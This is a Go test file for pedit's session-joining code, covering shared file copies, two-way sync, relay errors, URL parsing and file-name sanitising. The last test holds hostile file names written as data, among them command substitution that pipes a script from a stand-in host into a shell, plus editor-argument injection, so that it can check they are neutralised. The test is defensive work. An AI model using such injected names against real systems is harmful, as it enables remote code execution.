package session

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/piconic-ai/pedit/internal/filewriter"
	"github.com/piconic-ai/pedit/internal/protocol"
	"github.com/piconic-ai/pedit/internal/protocol/prototest"
)

// joinFromCLI joins the room of f as a second pedit would, keeping its copy in
// a fresh directory.
type joinCLIOpts struct {
	JoinOptions
	// temporary leaves Directory empty, so the copy goes to a temporary directory.
	temporary bool
	// beforePublishWriter is Session.beforePublishWriter for the joined session.
	beforePublishWriter func()
}

func joinFromCLI(t *testing.T, f *fixture, o joinCLIOpts) (*Session, error) {
	t.Helper()
	if o.URL == "" {
		o.URL = f.session.URL
	}
	if o.beforePublishWriter != nil {
		o.JoinOptions.beforePublishWriter = o.beforePublishWriter
	}
	if o.Directory == "" && !o.temporary {
		o.Directory = t.TempDir()
	}
	if o.WriteDelay == 0 {
		o.WriteDelay = 20 * time.Millisecond
	}
	o.Dial = f.relay.Dial
	s, err := Join(context.Background(), o.JoinOptions)
	if err == nil {
		t.Cleanup(func() { _ = s.Stop() })
	}
	return s, err
}

func TestJoinWritesACopyNamedAsTheHostsFile(t *testing.T) {
	f := setup(t, "# notes\n", setupOpts{})
	g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{}})
	if err != nil {
		t.Fatal(err)
	}
	if filepath.Base(g.File()) != "notes.md" || g.File() == f.file {
		t.Fatalf("copy = %q (host file %q)", g.File(), f.file)
	}
	if got := readFile(t, g.File()); got != "# notes\n" {
		t.Fatalf("copy = %q", got)
	}
	if got := f.session.Text.ToString(); got != "# notes\n" {
		t.Fatalf("host doc = %q after a join", got)
	}
}

func TestJoinWritesAnEmptyCopyForAnEmptyFile(t *testing.T) {
	f := setup(t, "", setupOpts{})
	g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{}})
	if err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, g.File()); got != "" {
		t.Fatalf("copy = %q", got)
	}
}

func TestJoinedCopiesArePrivateInExistingDirectory(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("Unix file permissions")
	}
	for _, initial := range []string{"", "private text"} {
		t.Run(fmt.Sprintf("initial=%q", initial), func(t *testing.T) {
			f := setup(t, initial, setupOpts{})
			dir := t.TempDir()
			if err := os.Chmod(dir, 0o755); err != nil {
				t.Fatal(err)
			}
			g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
			if err != nil {
				t.Fatal(err)
			}
			info, err := os.Stat(g.File())
			if err != nil {
				t.Fatal(err)
			}
			if info.Mode().Perm() != 0o600 {
				t.Fatalf("joined copy mode = %v", info.Mode())
			}
		})
	}
}

func TestJoinTellsWhenItCannotSaveTheCopy(t *testing.T) {
	f := setup(t, "one\n", setupOpts{})
	browser := joinAsGuest(t, f.relay, f.session.URL)
	prototest.WaitFor(t, wait, func() bool { return browser.String() == "one\n" }, "browser to sync")
	n := newNoticeLog(t)
	// Saves are tried again every 50ms.
	g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{WriteDelay: 10 * time.Millisecond, OnNotice: n.add}})
	if err != nil {
		t.Fatal(err)
	}

	blockWithDirectory(t, g.File())
	browser.insert(0, "zero\n")
	failed := n.waitFor(SaveFailed)
	if failed.File != g.File() || failed.Reason != "it is no longer a regular file" {
		t.Fatalf("notice = %+v", failed)
	}
	if err := os.Remove(g.File()); err != nil {
		t.Fatal(err)
	}
	n.waitFor(SaveRecovered)
	if got := readFile(t, g.File()); got != "zero\none\n" {
		t.Fatalf("copy = %q", got)
	}
	if got := n.kinds(); !slices.Equal(got, []NoticeKind{SaveFailed, SaveRecovered}) {
		t.Fatalf("kinds = %v", got)
	}
}

// Join returns the failure of its first write as an error, which the caller
// prints. Telling it as well would print it twice.
func TestJoinReturnsItsFirstWriteFailureWithoutTellingIt(t *testing.T) {
	f := setup(t, "# notes\n", setupOpts{})
	dir := t.TempDir()
	file := filepath.Join(dir, "notes.md")
	// Something that is not a file takes the copy's place as it is written.
	var once sync.Once
	hook := func(s filewriter.Step) {
		if s != filewriter.StepTempWritten {
			return
		}
		once.Do(func() {
			if err := os.Mkdir(file, 0o755); err != nil {
				t.Error(err)
			}
		})
	}
	n := newNoticeLog(t)
	var mu sync.Mutex
	var debugged []error
	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{
		Directory:  dir,
		WriteDelay: time.Minute,
		writeHook:  hook,
		OnNotice:   n.add,
		OnError: func(err error) {
			mu.Lock()
			defer mu.Unlock()
			debugged = append(debugged, err)
		},
	}})
	if err == nil || !strings.HasPrefix(err.Error(), "cannot write "+file+": ") || !errors.Is(err, filewriter.ErrNotRegular) {
		t.Fatalf("err = %v", err)
	}
	time.Sleep(100 * time.Millisecond)
	if got := n.all(); len(got) != 0 {
		t.Fatalf("notices = %+v", got)
	}
	// Nobody can act on it besides what the error says, so it is only debugged.
	mu.Lock()
	defer mu.Unlock()
	if len(debugged) != 1 || !errors.Is(debugged[0], filewriter.ErrNotRegular) {
		t.Fatalf("debugged = %v", debugged)
	}
}

func TestJoinWritesAnEditThatArrivesWhileTheCopyIsSetUp(t *testing.T) {
	for _, initial := range []string{"# notes\n", ""} {
		t.Run(fmt.Sprintf("initial %q", initial), func(t *testing.T) {
			f := setup(t, initial, setupOpts{})
			browser := joinAsGuest(t, f.relay, f.session.URL)
			prototest.WaitFor(t, wait, func() bool { return browser.String() == initial }, "browser to sync")
			// The browser edits while the joiner is between its first snapshot
			// and the writer that later edits are scheduled on. The edit
			// reaches the joiner's client, which must wait for the lock.
			g, err := joinFromCLI(t, f, joinCLIOpts{beforePublishWriter: func() {
				browser.insert(len(initial), "- late\n")
				time.Sleep(100 * time.Millisecond)
			}})
			if err != nil {
				t.Fatal(err)
			}
			want := initial + "- late\n"
			prototest.WaitFor(t, wait, func() bool { return readFile(t, g.File()) == want }, "copy with the late edit")
		})
	}
}

func TestJoinedCopySyncsBothWays(t *testing.T) {
	f := setup(t, "one\n", setupOpts{watch: true})
	g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Watch: true}})
	if err != nil {
		t.Fatal(err)
	}
	browser := joinAsGuest(t, f.relay, f.session.URL)
	prototest.WaitFor(t, wait, func() bool { return browser.String() == "one\n" }, "browser to sync")

	// Edited in the guest's own editor: reaches the host's file and the browser.
	if err := os.WriteFile(g.File(), []byte("one\ntwo\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	prototest.WaitFor(t, wait, func() bool { return readFile(t, f.file) == "one\ntwo\n" }, "host file")
	prototest.WaitFor(t, wait, func() bool { return browser.String() == "one\ntwo\n" }, "browser")

	// Edited in the host's editor: reaches the copy.
	if err := os.WriteFile(f.file, []byte("zero\none\ntwo\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	prototest.WaitFor(t, wait, func() bool { return readFile(t, g.File()) == "zero\none\ntwo\n" }, "copy")

	// Edited in the browser: reaches both files.
	browser.insert(len("zero\none\ntwo\n"), "three\n")
	const all = "zero\none\ntwo\nthree\n"
	prototest.WaitFor(t, wait, func() bool { return readFile(t, g.File()) == all }, "copy from browser")
	prototest.WaitFor(t, wait, func() bool { return readFile(t, f.file) == all }, "host file from browser")
}

func TestJoinedSessionAppearsAsAGuest(t *testing.T) {
	f := setup(t, "x", setupOpts{})
	browser := joinAsGuest(t, f.relay, f.session.URL)
	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Name: "ken"}})
	if err != nil {
		t.Fatal(err)
	}
	prototest.WaitFor(t, wait, func() bool {
		for id, st := range browser.aw.GetStates() {
			if id == browser.aw.ClientID() {
				continue
			}
			if st.State["role"] == "guest" && displayName(st.State) == "ken" {
				return true
			}
		}
		return false
	}, "the browser to see the CLI guest")
}

func TestJoinedCopyStaysWhenTheHostLeaves(t *testing.T) {
	f := setup(t, "keep me\n", setupOpts{})
	var statuses []protocol.Status
	done := make(chan struct{}, 1)
	g, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{OnStatus: func(s protocol.Status) {
		statuses = append(statuses, s)
		if s == protocol.StatusClosed {
			done <- struct{}{}
		}
	}}})
	if err != nil {
		t.Fatal(err)
	}
	if err := f.session.Stop(); err != nil {
		t.Fatal(err)
	}
	select {
	case <-done:
	case <-time.After(wait):
		t.Fatalf("statuses = %v", statuses)
	}
	if err := g.Stop(); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, g.File()); got != "keep me\n" {
		t.Fatalf("copy = %q", got)
	}
}

func TestJoinWithoutDirectoryUsesATemporaryCopyAndRemovesIt(t *testing.T) {
	f := setup(t, "# notes\n", setupOpts{})
	g, err := joinFromCLI(t, f, joinCLIOpts{temporary: true})
	if err != nil {
		t.Fatal(err)
	}
	if !g.Temporary() {
		t.Fatal("copy should be temporary")
	}
	dir := filepath.Dir(g.File())
	if filepath.Base(g.File()) != "notes.md" || !strings.HasPrefix(filepath.Base(dir), "pedit-AAAAAAAAAAAAAAAAAAAAAA-") {
		t.Fatalf("copy = %q", g.File())
	}
	if rel, err := filepath.Rel(os.TempDir(), dir); err != nil || strings.HasPrefix(rel, "..") {
		t.Fatalf("copy outside the temporary directory: %q", dir)
	}
	if got := readFile(t, g.File()); got != "# notes\n" {
		t.Fatalf("copy = %q", got)
	}
	if err := g.Stop(); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dir); !errors.Is(err, os.ErrNotExist) {
		t.Fatalf("temporary directory after Stop: %v", err)
	}
}

func TestKeepCopyKeepsATemporaryCopy(t *testing.T) {
	f := setup(t, "# notes\n", setupOpts{})
	g, err := joinFromCLI(t, f, joinCLIOpts{temporary: true})
	if err != nil {
		t.Fatal(err)
	}
	dir := filepath.Dir(g.File())
	t.Cleanup(func() { _ = os.RemoveAll(dir) })
	g.KeepCopy()
	if g.Temporary() {
		t.Fatal("copy should stay")
	}
	if err := g.Stop(); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, g.File()); got != "# notes\n" {
		t.Fatalf("copy = %q", got)
	}
}

func TestJoinWithDirectoryKeepsTheCopy(t *testing.T) {
	f := setup(t, "keep\n", setupOpts{})
	g, err := joinFromCLI(t, f, joinCLIOpts{})
	if err != nil {
		t.Fatal(err)
	}
	if g.Temporary() {
		t.Fatal("copy should stay")
	}
	if err := g.Stop(); err != nil {
		t.Fatal(err)
	}
	if got := readFile(t, g.File()); got != "keep\n" {
		t.Fatalf("copy = %q", got)
	}
}

func TestJoinRemovesTheTemporaryDirectoryWhenJoiningFails(t *testing.T) {
	f := setup(t, `{"nodes":[],"edges":[]}`, setupOpts{name: "board.canvas"})
	before := tempDirs(t)
	if _, err := joinFromCLI(t, f, joinCLIOpts{temporary: true}); err == nil {
		t.Fatal("joined a canvas room")
	}
	if after := tempDirs(t); len(after) != len(before) {
		t.Fatalf("temporary directories left behind: %v", after)
	}
}

// tempDirs lists pedit's temporary copy directories for this test's room.
func tempDirs(t *testing.T) []string {
	t.Helper()
	matches, err := filepath.Glob(filepath.Join(os.TempDir(), "pedit-AAAAAAAAAAAAAAAAAAAAAA-*"))
	if err != nil {
		t.Fatal(err)
	}
	return matches
}

func TestJoinRefusesToClobberAFile(t *testing.T) {
	f := setup(t, "x", setupOpts{})
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "notes.md"), []byte("mine"), 0o644); err != nil {
		t.Fatal(err)
	}
	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
	var exists *ErrFileExists
	if !errors.As(err, &exists) || exists.Path != filepath.Join(dir, "notes.md") {
		t.Fatalf("err = %v", err)
	}
	if got := readFile(t, filepath.Join(dir, "notes.md")); got != "mine" {
		t.Fatalf("file = %q", got)
	}
}

func TestJoinRefusesACanvasRoom(t *testing.T) {
	f := setup(t, `{"nodes":[],"edges":[]}`, setupOpts{name: "board.canvas"})
	dir := t.TempDir()
	_, err := joinFromCLI(t, f, joinCLIOpts{JoinOptions: JoinOptions{Directory: dir}})
	if err == nil || !strings.Contains(err.Error(), "canvas") {
		t.Fatalf("err = %v", err)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Fatalf("wrote %v", entries)
	}
}

func TestJoinFailsWhenNobodyHosts(t *testing.T) {
	relay := prototest.NewRelay(true)
	_, err := Join(context.Background(), JoinOptions{
		URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
		Directory: t.TempDir(),
		Dial:      relay.Dial,
	})
	if !errors.Is(err, ErrRoomClosed) {
		t.Fatalf("err = %v", err)
	}
}

func TestJoinFailsWhenTheRoomIsFull(t *testing.T) {
	relay := prototest.NewRelay(true)
	relay.Guests = 1
	url := "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey()
	host, err := relay.Dial(context.Background(), "", http.Header{"Authorization": {"Bearer t"}})
	if err != nil {
		t.Fatal(err)
	}
	defer host.Close()
	guest, err := relay.Dial(context.Background(), "", http.Header{})
	if err != nil {
		t.Fatal(err)
	}
	defer guest.Close()
	_, err = Join(context.Background(), JoinOptions{URL: url, Directory: t.TempDir(), Dial: relay.Dial})
	if !errors.Is(err, ErrRoomFull) {
		t.Fatalf("err = %v", err)
	}
}

func TestJoinSaysWhyTheServerTurnedItAway(t *testing.T) {
	for code, want := range map[int]error{
		protocol.ClientOutdated:   ErrClientOutdated,
		protocol.ServerOutdated:   ErrServerOutdated,
		protocol.RelayMaintenance: ErrRelayMaintenance,
		protocol.MessageTooBig:    ErrTooLarge,
		protocol.RoomExpired:      ErrRoomExpired,
	} {
		relay := prototest.NewRelay(false)
		relay.Refuse = code
		dir := t.TempDir()
		_, err := Join(context.Background(), JoinOptions{
			URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
			Directory: dir,
			Dial:      relay.Dial,
		})
		if !errors.Is(err, want) {
			t.Fatalf("err = %v, want %v", err, want)
		}
		if n := len(relay.URLs()); n != 1 {
			t.Fatalf("dialed %d times", n)
		}
	}
}

// The CLI cancels the join on a final status, so cancellation and the closed
// room arrive together; the reason must not be lost to the cancellation.
func TestJoinReportsWhyEvenWhenOnStatusCancels(t *testing.T) {
	for i := 0; i < 5000; i++ {
		relay := prototest.NewRelay(false)
		relay.Refuse = protocol.ClientOutdated
		ctx, cancel := context.WithCancel(context.Background())
		_, err := Join(ctx, JoinOptions{
			URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
			Directory: t.TempDir(),
			Dial:      relay.Dial,
			OnStatus: func(st protocol.Status) {
				if st.Final() {
					cancel()
				}
			},
		})
		cancel()
		if !errors.Is(err, ErrClientOutdated) {
			t.Fatalf("attempt %d: err = %v", i, err)
		}
	}
}

func TestJoinGivesUpWhenTheHostStaysSilent(t *testing.T) {
	// An unhosted relay lets a guest in, but nobody answers.
	relay := prototest.NewRelay(false)
	_, err := Join(context.Background(), JoinOptions{
		URL:       "https://edit.example/r/AAAAAAAAAAAAAAAAAAAAAA#" + protocol.GenerateKey(),
		Directory: t.TempDir(),
		Dial:      relay.Dial,
		Timeout:   200 * time.Millisecond,
	})
	if err == nil || !strings.Contains(err.Error(), "no host answered") {
		t.Fatalf("err = %v", err)
	}
}

func TestParseShareURL(t *testing.T) {
	key := protocol.GenerateKey()
	ws, id, raw, err := parseShareURL("https://edit.piconic.ai/r/AAAAAAAAAAAAAAAAAAAAAA#" + key)
	if err != nil || ws != "wss://edit.piconic.ai/api/rooms/AAAAAAAAAAAAAAAAAAAAAA/ws" || id != "AAAAAAAAAAAAAAAAAAAAAA" || len(raw) != protocol.KeyBytes {
		t.Fatalf("= %q, %q, %d bytes, %v", ws, id, len(raw), err)
	}
	if ws, _, _, err = parseShareURL("http://localhost:8787/r/ROOM_-1#" + key); err != nil || ws != "ws://localhost:8787/api/rooms/ROOM_-1/ws" {
		t.Fatalf("= %q, %v", ws, err)
	}
	for _, link := range []string{
		"notes.md",
		"https://edit.piconic.ai/ROOM#" + key,
		"https://edit.piconic.ai/r/ROOM/x#" + key,
		"https://edit.piconic.ai/r/..#" + key,
		"https://edit.piconic.ai/r/ROOM%2F..#" + key,
		"https://edit.piconic.ai/r/ROOM",
		"https://edit.piconic.ai/r/ROOM#not-a-key!",
	} {
		_, _, _, err := parseShareURL(link)
		if err == nil {
			t.Errorf("%s: accepted", link)
		} else if strings.Contains(err.Error(), key) {
			t.Errorf("%s: key leaked in %q", link, err)
		}
	}
}

func TestSharedFileName(t *testing.T) {
	for name, ok := range map[string]bool{
		"notes.md": true, "議事録.md": true, "": false, ".": false, "..": false,
		"../x.md": false, `..\x.md`: false, "a/b.md": false, "a\x00.md": false, "a\n.md": false,
		"invoice\u202ecod.md": false, "a\u2066b.md": false, "a\u200fb.md": false, "👨\u200d👩\u200d👧.md": true,
	} {
		if _, got := sharedFileName(map[string]any{"file": name}); got != ok {
			t.Errorf("%q: ok = %v", name, got)
		}
	}
}

func TestSharedFileNameDefusesShellCharacters(t *testing.T) {
	for name, want := range map[string]string{
		"notes$(curl -s evil.example|sh).md":              "notes__curl_-s_evil.example_sh_.md",
		"a`id`;b&c>d<e.md":                                "a_id__b_c_d_e.md",
		"notes -c '!printf PEDIT_EDITOR_EXECUTED' -c qa!": "notes_-c___printf_PEDIT_EDITOR_EXECUTED__-c_qa_",
		"!!.md":                          "__.md",
		`a"b%PATH%^c~d*e?f[g]h{i}j#k.md`: "a_b_PATH__c_d_e_f_g_h_i_j_k.md",
		"notes (1).md":                   "notes__1_.md",
		"v1.2_final-draft+x,y@z=w.md":    "v1.2_final-draft+x,y@z=w.md",
		"議事録（第1回）.md":                    "議事録（第1回）.md",
		"👨\u200d👩\u200d👧.md":             "👨\u200d👩\u200d👧.md",
		"a\u00a0b\u3000c.md":             "a_b_c.md",
		"a\u2014b\u201cc\u2019d.md":      "a_b_c_d.md",
		"a\u2016b.md":                    "a\u2016b.md",
	} {
		if got, ok := sharedFileName(map[string]any{"file": name}); !ok || got != want {
			t.Errorf("%q = %q, %v; want %q", name, got, ok, want)
		}
	}
}
